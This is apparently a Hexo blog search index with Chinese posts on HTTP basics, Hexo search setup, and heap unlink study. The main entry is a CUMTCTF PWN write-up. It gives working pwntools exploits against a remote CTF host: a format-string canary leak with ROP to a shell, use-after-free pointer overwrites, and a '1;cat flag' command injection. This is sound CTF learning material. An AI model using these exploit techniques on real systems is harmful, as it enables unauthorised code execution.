<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>HTTP协议学习</title>
    <url>/2021/03/26/http/</url>
    <content><![CDATA[<h1 id="http协议学习"><a class="markdownIt-Anchor" href="#http协议学习"></a> HTTP协议学习</h1>
<h2 id="http和https的区别"><a class="markdownIt-Anchor" href="#http和https的区别"></a> http和https的区别：</h2>
<ol>
<li>HTTP 的URL 以http:// 开头，而HTTPS 的URL 以https:// 开头</li>
<li>HTTP 是不安全的，而 HTTPS 是安全的</li>
<li>HTTP 标准端口是80 ，而 HTTPS 的标准端口是443</li>
<li>在OSI 网络模型中，HTTP工作于应用层，而HTTPS 的安全传输机制工作在传输层</li>
<li>HTTP 无法加密，而HTTPS 对传输的数据进行加密</li>
<li>HTTP无需证书，而HTTPS 需要CA机构wosign的颁发的SSL证书</li>
</ol>
<h2 id="http为什么是无状态协议如何解决"><a class="markdownIt-Anchor" href="#http为什么是无状态协议如何解决"></a> http为什么是无状态协议？如何解决？</h2>
<p>HTTP 是一种不保存状态，即无状态（stateless）协议。HTTP 协议自身不对请求和响应之间的通信状态进行保存。也就是说在 HTTP 这个级别，协议对于发送过的请求或响应都不做持久化处理</p>
<p><strong>解决：</strong></p>
<ul>
<li>基于Session实现的会话保持<br>
在会话开始时（客户端第一次像服务器发送http请求），服务器将会话状态保存起来（本机内存或数据库中），然后分配一个会话标识（SessionId）给客户端，这个会话标识一般保存在客户端Cookie中，以后每次浏览器发送http请求都会带上Cookie中的SessionId到服务器，服务器拿到会话标识就可以把之前存储在服务器端的状态信息与会话联系起来，实现会话保持（如果遇到浏览器禁用Cookie的情况，则可以通过url重写的方式将会话标识放在url的参数里，也可实现会话保持）</li>
<li>基于Cookie实现的会话保持<br>
基于Cookie实现会话保持与上述基于Session实现会话保持的最主要区别是前者完全将会话状态信息存储在浏览器Cookie中，这样一来每次浏览器发送HTTP请求的时候都会带上状态信息，因此也就可以实现状态保持。</li>
</ul>
<h2 id="http常用的方法"><a class="markdownIt-Anchor" href="#http常用的方法"></a> http常用的方法</h2>
<ul>
<li>GET： 用于请求访问已经被URI（统一资源标识符）识别的资源，可以通过URL传参给服务器</li>
<li>POST：用于传输信息给服务器，主要功能与GET方法类似，但一般推荐使用POST方式。</li>
<li>PUT： 传输文件，报文主体中包含文件内容，保存到对应URI位置。</li>
<li>HEAD： 获得报文首部，与GET方法类似，只是不返回报文主体，一般用于验证URI是否有效。</li>
<li>DELETE：删除文件，与PUT方法相反，删除对应URI位置的文件。</li>
<li>OPTIONS：查询相应URI支持的HTTP方法。</li>
</ul>
<h2 id="http请求报文与响应报文格式"><a class="markdownIt-Anchor" href="#http请求报文与响应报文格式"></a> HTTP请求报文与响应报文格式</h2>
<p>请求报文包含四部分：</p>
<p><img src="/2021/03/26/http/1.png" alt="1"></p>
<ul>
<li>a、请求行：包含请求方法、URI、HTTP版本信息</li>
<li>b、请求首部字段</li>
<li>c、请求内容实体</li>
<li>d、空行</li>
</ul>
<p>响应报文包含四部分：</p>
<p><img src="/2021/03/26/http/2.png" alt="2"></p>
<p>常见的首部：</p>
<ul>
<li><strong>通用首部字段（请求报文与响应报文都会使用的首部字段）</strong>
<ul>
<li>Date：创建报文时间</li>
<li>Connection：连接的管理</li>
<li>Cache-Control：缓存的控制</li>
<li>Transfer-Encoding：报文主体的传输编码方式</li>
</ul>
</li>
<li><strong>请求首部字段（请求报文会使用的首部字段）</strong>
<ul>
<li>Host：请求资源所在服务器</li>
<li>Accept：可处理的媒体类型</li>
<li>Accept-Charset：可接收的字符集</li>
<li>Accept-Encoding：可接受的内容编码</li>
<li>Accept-Language：可接受的自然语言</li>
</ul>
</li>
<li><strong>响应首部字段（响应报文会使用的首部字段）</strong>
<ul>
<li>Accept-Ranges：可接受的字节范围</li>
<li>Location：令客户端重新定向到的URI</li>
<li>Server：HTTP服务器的安装信息</li>
</ul>
</li>
<li><strong>实体首部字段（请求报文与响应报文的的实体部分使用的首部字段）</strong>
<ul>
<li>Allow：资源可支持的HTTP方法</li>
<li>Content-Type：实体主类的类型</li>
<li>Content-Encoding：实体主体适用的编码方式</li>
<li>Content-Language：实体主体的自然语言</li>
<li>Content-Length：实体主体的的字节数</li>
<li>Content-Range：实体主体的位置范围，一般用于发出部分请求时使用</li>
</ul>
</li>
</ul>
<h2 id="https工作原理"><a class="markdownIt-Anchor" href="#https工作原理"></a> HTTPS工作原理</h2>
<ul>
<li>一、首先HTTP请求服务端生成证书，客户端对证书的有效期、合法性、域名是否与请求的域名一致、证书的公钥（RSA加密）等进行校验；</li>
<li>二、客户端如果校验通过后，就根据证书的公钥的有效， 生成随机数，随机数使用公钥进行加密（RSA加密）；</li>
<li>三、消息体产生的后，对它的摘要进行MD5（或者SHA1）算法加密，此时就得到了RSA签名；</li>
<li>四、发送给服务端，此时只有服务端（RSA私钥）能解密。</li>
<li>五、解密得到的随机数，再用AES加密，作为密钥（此时的密钥只有客户端和服务端知道）。</li>
</ul>
<h2 id="一次完整的http请求"><a class="markdownIt-Anchor" href="#一次完整的http请求"></a> 一次完整的HTTP请求</h2>
<p>HTTP通信机制是在一次完整的HTTP通信过程中，Web浏览器与Web服务器之间将完成下列7个步骤：</p>
<ul>
<li>建立TCP连接</li>
</ul>
<p>在HTTP工作开始之前，Web浏览器首先要通过网络与Web服务器建立连接，该连接是通过TCP来完成的，该协议与IP协议共同构建 Internet，即著名的TCP/IP协议族，因此Internet又被称作是TCP/IP网络。<strong>HTTP是比TCP更高层次的应用层协议，根据规则， 只有低层协议建立之后才能，才能进行更层协议的连接，因此，首先要建立TCP连接，一般TCP连接的端口号是80。</strong></p>
<ul>
<li>Web浏览器向Web服务器发送请求行</li>
</ul>
<p>一旦建立了TCP连接，<strong>Web浏览器就会向Web服务器发送请求命令</strong>。例如：GET /sample/hello.jsp HTTP/1.1。</p>
<ul>
<li>Web浏览器发送请求头
<ul>
<li>浏览器发送其请求命令之后，还要以头信息的形式向Web服务器发送一些别的信息，<strong>之后浏览器发送了一空白行来通知服务器</strong>，它已经结束了该头信息的发送。</li>
</ul>
</li>
<li>Web服务器应答
<ul>
<li>客户机向服务器发出请求后，服务器会客户机回送应答， <strong>HTTP/1.1 200 OK ，应答的第一部分是协议的版本号和应答状态码。</strong></li>
</ul>
</li>
<li>Web服务器发送应答头
<ul>
<li>正如客户端会随同请求发送关于自身的信息一样，服务器也会随同应答向用户发送关于它自己的数据及被请求的文档。</li>
</ul>
</li>
<li>Web服务器向浏览器发送数据
<ul>
<li>Web服务器向浏览器发送头信息后，它会发送一个空白行来表示头信息的发送到此为结束，接着，<strong>它就以Content-Type应答头信息所描述的格式发送用户所请求的实际数据</strong>。</li>
</ul>
</li>
<li>Web服务器关闭TCP连接
<ul>
<li>一般情况下，一旦Web服务器向浏览器发送了请求数据，它就要关闭TCP连接，然后如果浏览器或者服务器在其头信息加入了这行代码：</li>
</ul>
</li>
</ul>
<figure class="highlight armasm"><table><tr><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">Connection:</span><span class="hljs-meta">keep</span>-alive<br></code></pre></td></tr></table></figure>
<p>TCP连接在发送后将仍然保持打开状态，于是，浏览器可以继续通过相同的连接发送请求。保持连接节省了为每个请求建立新连接所需的时间，还节约了网络带宽。</p>
<p><strong>建立TCP连接-&gt;发送请求行-&gt;发送请求头-&gt;（到达服务器）发送状态行-&gt;发送响应头-&gt;发送响应数据-&gt;断TCP连接</strong></p>
<h2 id="常见的http相应状态码"><a class="markdownIt-Anchor" href="#常见的http相应状态码"></a> 常见的HTTP相应状态码</h2>
<ul>
<li>200：请求被正常处理</li>
<li>204：请求被受理但没有资源可以返回</li>
<li>206：客户端只是请求资源的一部分，服务器只对请求的部分资源执行GET方法，相应报文中通过Content-Range指定范围的资源。</li>
<li>301：永久性重定向</li>
<li>302：临时重定向</li>
<li>303：与302状态码有相似功能，只是它希望客户端在请求一个URI的时候，能通过GET方法重定向到另一个URI上</li>
<li>304：发送附带条件的请求时，条件不满足时返回，与重定向无关</li>
<li>307：临时重定向，与302类似，只是强制要求使用POST方法</li>
<li>400：请求报文语法有误，服务器无法识别</li>
<li>401：请求需要认证</li>
<li>403：请求的对应资源禁止被访问</li>
<li>404：服务器无法找到对应资源</li>
<li>500：服务器内部错误</li>
<li>503：服务器正忙</li>
</ul>
<h2 id="http11版本新特性"><a class="markdownIt-Anchor" href="#http11版本新特性"></a> HTTP1.1版本新特性</h2>
<ul>
<li>a、<strong>默认持久连接节省通信量</strong>，只要客户端服务端任意一端没有明确提出断开TCP连接，就一直保持连接，可以发送多次HTTP请求</li>
<li>b、<strong>管线化，客户端可以同时发出多个HTTP请求，而不用一个个等待响应</strong></li>
<li>c、<strong>断点续传</strong>
<ul>
<li><strong>实际上就是利用HTTP消息头使用分块传输编码，将实体主体分块传输。</strong></li>
</ul>
</li>
</ul>
<h2 id="http优化方案"><a class="markdownIt-Anchor" href="#http优化方案"></a> HTTP优化方案</h2>
<ul>
<li><strong>TCP复用：TCP连接复用是将多个客户端的HTTP请求复用到一个服务器端TCP连接上，而HTTP复用则是一个客户端的多个HTTP请求通过一个TCP连接进行处理。前者是负载均衡设备的独特功能；而后者是HTTP 1.1协议所支持的新功能，目前被大多数浏览器所支持。</strong></li>
<li><strong>内容缓存：将经常用到的内容进行缓存起来，那么客户端就可以直接在内存中获取相应的数据了。</strong></li>
<li><strong>压缩：将文本数据进行压缩，减少带宽</strong></li>
<li><strong>SSL加速（SSL Acceleration）：使用SSL协议对HTTP协议进行加密，在通道内加密并加速</strong></li>
<li><strong>TCP缓冲：通过采用TCP缓冲技术，可以提高服务器端响应时间和处理效率，减少由于通信链路问题给服务器造成的连接负担。</strong></li>
</ul>
<blockquote>
<p><em><strong>参考文章：<a href="https://blog.csdn.net/yicixing7/article/details/79320821">https://blog.csdn.net/yicixing7/article/details/79320821</a></strong></em></p>
</blockquote>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>web学习</tag>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title>CUMTCTF春季赛-PWN</title>
    <url>/2021/03/30/cumtctf/</url>
    <content><![CDATA[<p>首先庆祝一下咋队得第二吧（原来是第二的，把密码学交了就显示第一了，当时没做出来）</p>
<p><img src="/2021/03/30/cumtctf/%E7%AC%AC%E4%B8%80.png" alt="图片"></p>
<h1 id="pwn1"><a class="markdownIt-Anchor" href="#pwn1"></a> PWN1</h1>
<p>查看程序，逻辑是读取你输入的字符串，然后和CUMTCTF对比，如果通过就执行bin/sh</p>
<p><img src="/2021/03/30/cumtctf/1.jpg" alt="img"></p>
<p>在比较前下个断点，进行调试，发现此时对比的是地址0x4008d5</p>
<p><img src="/2021/03/30/cumtctf/2.jpg" alt="img"></p>
<p>在看程序中输入的格式是“ld”，说明我们只能输入长整形，所以我们把0x4008d5转换为10进制进行输入4196565，然后调试.，发现此时验证通过了。</p>
<p><img src="/2021/03/30/cumtctf/3.jpg" alt="img"></p>
<p>拿到flag</p>
<p><img src="/2021/03/30/cumtctf/4.jpg" alt="img"></p>
<h1 id="pwn2"><a class="markdownIt-Anchor" href="#pwn2"></a> PWN2</h1>
<p>先检查程序，发现程序开启了canary保护和堆栈不可执行</p>
<p><img src="/2021/03/30/cumtctf/5.jpg" alt="img"></p>
<p>然后查看程序，程序会先执行一个fmt（）函数，可以发现这里有一个格式字符串的漏洞，可以泄露canary值</p>
<p><img src="/2021/03/30/cumtctf/6.jpg" alt="img"></p>
<p>然后执行vul（）函数，可以看到这个函数读取的buf有0x64字节，而buf只有0x20字节存在栈溢出</p>
<p><img src="/2021/03/30/cumtctf/7.jpg" alt="img"><img src="/2021/03/30/cumtctf/8.jpg" alt="img"></p>
<p>所以解题思路是先泄露canary，然后构建rop链泄露puts函数地址，然后重启程序，再次泄露canary地址，构建rop链getshell</p>
<p><img src="/2021/03/30/cumtctf/9.jpg" alt="img"></p>
<p>因为canary的值距离栈顶是0x8个字节，64位Linux前六个参数用寄存器传递， 后面的才从栈上读取，所以要使var_8是printf函数的第8个参数，因此使用“%7$p”作为printf参数可以泄露出canary的值。所以payload如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">\<span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.binary=<span class="hljs-string">&#x27;pwn2&#x27;</span><br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn2&#x27;</span>)<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>\<span class="hljs-comment">#p=process(&#x27;./pwn2&#x27;)</span><br><br>p = remote(<span class="hljs-string">&quot;1.15.81.218&quot;</span>,<span class="hljs-number">10001</span>)<br><br>pop_rdi=<span class="hljs-number">0x400983</span><br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>start_addr=<span class="hljs-number">0x4006A0</span><br><br> <br><br>p.recvuntil(<span class="hljs-string">&quot;fmtstr,Do you konw it?&quot;</span>)<br><br>\<span class="hljs-comment"># 泄露canary</span><br><br>payload = <span class="hljs-string">&quot;%7$p&quot;</span><br><br>p.sendline(payload)<br><br>Canary=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&quot;00&quot;</span>),<span class="hljs-number">16</span>)<br><br>log.info(<span class="hljs-string">&quot;Canary:&quot;</span>+<span class="hljs-built_in">hex</span>(Canary)) <br><br>p.recvuntil(<span class="hljs-string">&quot;Remeber canary!!&quot;</span>)<br><br>\<span class="hljs-comment">#构造rop链泄露puts的地址，然后重启程序</span><br><br>payload = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">24</span>+p64(Canary)+<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(puts_got) + p64(puts_plt)+p64(start_addr)<br><br>p.send(payload)<br><br>\<span class="hljs-comment">#接收put真实地址</span><br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;\x00&quot;</span>)) <br><br>\<span class="hljs-comment">#计算libc基址</span><br><br>libc_base = puts_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>\<span class="hljs-comment">#获取程序中system的地址和/bin/sh的地址</span><br><br>binsh_addr = libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>).<span class="hljs-built_in">next</span>()+libc_base<br><br>system_addr=libc_base+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br> <br><br>p.recvuntil(<span class="hljs-string">&quot;fmtstr,Do you konw it?&quot;</span>)<br><br>\<span class="hljs-comment">#再次泄露canary值</span><br><br>payload = <span class="hljs-string">&quot;%7$p&quot;</span><br><br>p.sendline(payload)<br><br>Canary=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&quot;00&quot;</span>),<span class="hljs-number">16</span>)<br><br>log.info(<span class="hljs-string">&quot;Canary:&quot;</span>+<span class="hljs-built_in">hex</span>(Canary)) <br><br>p.recvuntil(<span class="hljs-string">&quot;Remeber canary!!&quot;</span>)<br><br>\<span class="hljs-comment">#构造rop链getshell</span><br><br>payload2 = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">24</span>+p64(Canary)+<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)<br><br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
<h1 id="pwn3"><a class="markdownIt-Anchor" href="#pwn3"></a> PWN3</h1>
<p>用ida打开程序，发现程序是一个选择菜单</p>
<p><img src="/2021/03/30/cumtctf/10.jpg" alt="img"></p>
<p>然后在选择1中，说是执行ping命令，但是没有进行过滤，会用system函数执行我们输入进去的命令</p>
<p><img src="/2021/03/30/cumtctf/11.jpg" alt="img"></p>
<p>选择1，然后1;cat flag，即可拿到Flag</p>
<p><img src="/2021/03/30/cumtctf/12.jpg" alt="img"></p>
<h1 id="pwn4"><a class="markdownIt-Anchor" href="#pwn4"></a> PWN4</h1>
<p>Ida打开程序，发现也是一个选择菜单</p>
<p><img src="/2021/03/30/cumtctf/a1.jpg" alt="img"></p>
<p>仔细观察每个选择，发现漏洞点在2.delete中，函数只是free了堆块，但是没有把指针置空，会造成uaf漏洞</p>
<p><img src="/2021/03/30/cumtctf/%E9%98%BF.jpg" alt="img"></p>
<p>Gdb调试：</p>
<p>先申请2个32字节的堆块（size为16 24 32的堆块free后会进入fastbin不会被合并）</p>
<p>可以看到我们申请的堆块对应一个内存堆和一个print_heap_name函数</p>
<p><img src="/2021/03/30/cumtctf/clip_image012.jpg" alt="img"></p>
<p>然后删除这两个堆块，可以看到删除的堆块进入了fastbin</p>
<p><img src="/2021/03/30/cumtctf/clip_image014.jpg" alt="img"></p>
<p>这时候我们申请一个堆块，size为8，内容为cccc</p>
<p><img src="/2021/03/30/cumtctf/clip_image016.jpg" alt="img"></p>
<p>此时覆盖了第一个堆块的print_heap_name函数指针</p>
<p><img src="/2021/03/30/cumtctf/clip_image018.jpg" alt="img"></p>
<p>然后我们选择show，就会调用这个指针，所以我们可以控制这个指针调用我们想要的函数</p>
<p><img src="/2021/03/30/cumtctf/clip_image020.jpg" alt="img"></p>
<p>程序中有后门函数，所以只要覆盖成这个就行</p>
<p><img src="/2021/03/30/cumtctf/clip_image022.jpg" alt="img"></p>
<p>Payload脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">\<span class="hljs-comment">#!/usr/bin/env python</span><br><br>\<span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.binary = <span class="hljs-string">&quot;./pwn4&quot;</span><br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;1.15.81.218&#x27;</span>, <span class="hljs-number">10003</span>)<br><br>backdoor = <span class="hljs-number">0x0000000400BCE</span><br><br>\<span class="hljs-comment">#p = process(&quot;./pwn4&quot;)</span><br><br>\<span class="hljs-comment">#添加一个size为32的堆块</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;32&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;6666&quot;</span>)<br><br>\<span class="hljs-comment">#添加一个size为32的堆块</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;32&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;7777&quot;</span>)<br><br>\<span class="hljs-comment">#删除index0</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br><br>\<span class="hljs-comment">#删除index1</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><br>\<span class="hljs-comment">#添加一个size为4的堆块，内容是后门函数</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(p32(backdoor))<br><br>\<span class="hljs-comment">#gdb.attach(p)</span><br><br>\<span class="hljs-comment">#调用index0的print指针</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br><br>p.interactive()<br><br> <br></code></pre></td></tr></table></figure>
<h1 id="pwn5"><a class="markdownIt-Anchor" href="#pwn5"></a> PWN5</h1>
<p>用ida打开程序，也是一个让我们选择的程序，选项1是创建账号，2是展示，3是删除，4是添加memory，5选项是验证main_account+16的位置的值是否等于1953330531，然后getshell</p>
<p><img src="/2021/03/30/cumtctf/clip_image024.jpg" alt="img"></p>
<p><img src="/2021/03/30/cumtctf/clip_image026.jpg" alt="img"></p>
<p>所以解题思路是覆盖这个位置的数据为1953330531</p>
<p>我们注意到删除账号的时候也只是进行了free，没有置空指针，有uaf漏洞利用</p>
<p><img src="/2021/03/30/cumtctf/clip_image028.jpg" alt="img"></p>
<p>然后在add memory时，可以读入256个字节。</p>
<p>Gdb调试：</p>
<p>先创建一个aaaa，bbbb的账号，堆内存如下</p>
<p><img src="/2021/03/30/cumtctf/clip_image030.jpg" alt="img"></p>
<p>然后尝试check，发现检查的main_account+16的位置是0x603010+0x40，也就是64个字节</p>
<p><img src="/2021/03/30/cumtctf/clip_image032.jpg" alt="img"></p>
<p>然后删除账号，添加一个memory，内容为68个c</p>
<p><img src="/2021/03/30/cumtctf/clip_image034.jpg" alt="img"></p>
<p>就可以覆盖到0x50的位置</p>
<p>所以只要把0x50位置的值覆盖为1953330531（十六进制0x746d7563）即可</p>
<p>Payload如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>\<span class="hljs-comment">#p = process(&#x27;./pwn5&#x27;)</span><br><br>p = remote(<span class="hljs-string">&#x27;1.15.81.218&#x27;</span>, <span class="hljs-number">10004</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Create_your_account</span>():</span><br><br>  p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br><br>  p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><br>  p.recvuntil(<span class="hljs-string">&quot;your first name:&quot;</span>)<br><br>  p.sendline(<span class="hljs-string">&quot;aaaa&quot;</span>)<br><br>  p.recvuntil(<span class="hljs-string">&quot;your last name:&quot;</span>)<br><br>  p.sendline(<span class="hljs-string">&quot;aaaa&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete_your_account</span>():</span><br><br>  p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br><br>  p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_memory</span>(<span class="hljs-params">payload</span>):</span><br><br>  p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br><br>  p.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br><br>  p.recvuntil(<span class="hljs-string">&quot;plz input what you want say:&quot;</span>)<br><br>  \<span class="hljs-comment">#gdb.attach(p)</span><br><br>  p.sendline(payload)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_CUMT</span>():</span><br><br>  p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br><br>  p.sendline(<span class="hljs-string">&quot;5&quot;</span>)<br><br>Create_your_account()<br><br>delete_your_account()<br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">64</span>+p64(<span class="hljs-number">0x746d7563</span>) <br><br>add_memory(payload)<br><br>\<span class="hljs-comment">#gdb.attach(p)</span><br><br>check_CUMT()<br><br>p.interactive()<br><br><br></code></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>PWN学习</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>PWN学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo启用搜索功能(图片测试)</title>
    <url>/2020/09/25/phtest/</url>
    <content><![CDATA[<h1 id="hexo启用搜索功能"><a class="markdownIt-Anchor" href="#hexo启用搜索功能"></a> Hexo启用搜索功能</h1>
<p>1.首先在Hexo的根目录下执行以下命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">npm install hexo-generator-searchdb --save <br></code></pre></td></tr></table></figure>
<p><img src="/2020/09/25/phtest/image-20210325172142569.png" alt="image-20210325172142569"></p>
<p>有WARN没关系，最后还是可以用的</p>
<p>2.在全局配置文件_config.yml，新增如下内容</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">search:</span><br>  <span class="hljs-attr">path:</span> <span class="hljs-string">search.xml</span><br>  <span class="hljs-attr">field:</span> <span class="hljs-string">post</span><br>  <span class="hljs-attr">format:</span> <span class="hljs-string">html</span><br>  <span class="hljs-attr">limit:</span> <span class="hljs-number">10000</span><br></code></pre></td></tr></table></figure>
<p>3.在主题配置文件_config.yml修改local_search为true</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">local_search:<br>    <span class="hljs-built_in">enable</span>: <span class="hljs-literal">true</span>```<br></code></pre></td></tr></table></figure>
<p>4.新建一个页面，命名为 search 。命令如下：</p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><code class="hljs haxe">hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> search<br></code></pre></td></tr></table></figure>
<p>5.编辑刚新建的页面，将页面的类型设置为 search</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">title</span>: search<br><span class="hljs-attribute">date</span>: <span class="hljs-number">2021</span>-<span class="hljs-number">03</span>-<span class="hljs-number">25</span> <span class="hljs-number">17</span>:<span class="hljs-number">09</span>:<span class="hljs-number">15</span><br><span class="hljs-attribute">type</span>: <span class="hljs-string">&quot;search&quot;</span><br></code></pre></td></tr></table></figure>
<p>6.执行hexo g和hexo d部署完成</p>
]]></content>
  </entry>
  <entry>
    <title>unlink漏洞学习</title>
    <url>/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="堆的unlink漏洞学习"><a class="markdownIt-Anchor" href="#堆的unlink漏洞学习"></a> 堆的unlink漏洞学习</h1>
<h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2>
<p>做实验做到的堆部分，第一个就是这个，以前没怎么详细做过堆的题，理解起来真的困难，看了几天才能理解，还是太菜了。就决定要把这个记录下来TAT</p>
<h2 id="unlink基本原理"><a class="markdownIt-Anchor" href="#unlink基本原理"></a> Unlink基本原理</h2>
<p>Unlink的目的是把一个双向链表中的空闲块拿出来（例如 free 时和目前物理相邻的 free chunk 进行合并）。其基本的过程如下</p>
<img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/unlink.png" alt="unlink基本原理" style="zoom:67%;">
<p>目的是为了把图中的P拿出来，然后使FD-&gt;bk=BK 以及BK-&gt;fd=FD，其实这里说的也已经很清楚<a href="https://wiki.x10sec.org/pwn/linux/glibc-heap/unlink-zh/#_2">CTF wiki unlink</a>，不过我就是不明白unlink的一个检查机制</p>
<p>双向链表指针破坏：前一个块的 fd 和下一个块的 bk 应该指向当前 unlink</p>
<p>块。当攻击者使用 free -12 和 shellcode 地址覆</p>
<p>盖 fd 和 bk 时， free 和 shellcode 地址 + 8 就不会指向当前 unlink 块</p>
<p>（ second ）。因此 glibc malloc 就抛出双向链表指针破坏错误。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))<br><span class="hljs-built_in">malloc_printerr</span> (check_action, <span class="hljs-string">&quot;corrupted double-linked</span><br><span class="hljs-string">list&quot;</span>, P); <br></code></pre></td></tr></table></figure>
<p>以及这个机制的绕过，这个机制主要是验证p-&gt; fd-&gt; bk == p 和 p-&gt; bk-&gt; fd == p</p>
<p>绕过主要是令伪造堆快的fd=这个堆快的指针位置-3*偏移，以及bk=这个堆快的指针位置-2*偏移</p>
<p>这个看得我真的很绕，一时间理解不能，还是太菜了（还有就是这类题都会有个全局指针？）</p>
<p>不过做了一道题后理解就很清楚了，果然不能光看。</p>
<h2 id="2014-hitcon-stkof"><a class="markdownIt-Anchor" href="#2014-hitcon-stkof"></a> 2014 HITCON stkof</h2>
<p>程序开启了canary和堆栈不可执行保护</p>
<img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213154332.png" alt="检查" style="zoom:67%;">                       
<p>程序运行后没有什么显示，但是根据ida查看可以知道，程序有3个功能</p>
<img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213239564.png" alt="运行" style="zoom:67%;">
